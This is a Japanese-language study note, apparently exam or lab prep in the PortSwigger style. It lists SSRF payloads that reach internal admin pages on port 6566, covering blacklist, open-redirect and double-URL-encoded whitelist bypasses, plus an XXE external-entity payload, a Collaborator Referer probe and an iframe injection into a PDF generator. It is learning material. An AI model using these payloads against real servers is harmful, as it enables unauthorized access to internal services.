###### 🚨
- 試験上、SSRF脆弱性があるなら、==port `6566`==にlocalhostのファイルが閲覧できる

#### 基本的なSSRF

```http
stockApi=http://192.168.0.x:6566/admin
```

###### blacklistのバイパス
```http
stockApi=http://127.1:6566/AdMiN/
```
- [[2.  一般的なSSRF防御の回避#SSRF ブラックリスト回避]]

###### Open redirect脆弱性を使用したフィルタのバイパス
```http
stockApi=/product/nextProduct?currentProductId=2<@urlencode>&path=<@/urlencode>http://192.168.0.x:6566/admin
```
- [[2.  一般的なSSRF防御の回避#Open redirectによるSSRFフィルタのバイパス]]

---
#### & XXE

1. bodyがXMLのPOSTリクエストに対してペイロードを埋め込む
```dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://localhost:6566"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```
2. エラーレスポンスの情報にファイル名などが表示されたら、それをペイロードに加えてさらに探索を続ける
	- 詳細：[[2. XXE攻撃によるファイル取得とSSRF攻撃#XXEによるSSRF攻撃の実行]]

---
#### Routing based

```http
Referer: http://COLLABOLATOR-DOMAIN
```

---
#### &OpenID

- [[3. OpenID Connectとその脆弱性#Unprotected dynamic client registration(動的クライアント登録の未保護)]]

---
#### Advanced
###### whitelistのバイパス
- Expert LAB
```http
stockApi=http://localhost:6566<@urlencode><@urlencode>#<@/urlencode><@/urlencode>@stock.weliketoshop.net/admin/
```
- [[2.  一般的なSSRF防御の回避#SSRF ホワイトリスト回避]]


###### Admin panel - Download report as PDF SSRF
![[Pasted image 20240206201454.png]]
```http
<iframe src='http://localhost:6566/secret' height='500' width='500'>
```

